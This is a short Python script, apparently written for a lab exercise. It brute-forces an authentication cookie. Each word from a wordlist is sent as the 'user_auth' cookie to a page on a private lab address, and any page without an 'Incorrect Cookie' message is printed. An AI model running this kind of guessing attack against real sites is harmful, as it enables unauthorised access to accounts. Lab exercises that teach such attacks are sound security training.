# brute.py
# Celvis
# This is apart of lab9

# Import
import requests

# list
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()

# Loop
for i in lines:
    #print(i.replace("\n",""))
    myCookie = {'user_auth':i.replace("\n","")}
    response = requests.get('http://172.25.0.29/page1.php', cookies = myCookie)
    
    # save current webpage text into a variable
    currentPageText = response.text

    # Check
    if "Incorrect Cookie" not in currentPageText:
        # Output the returned webpage
        print(response.text)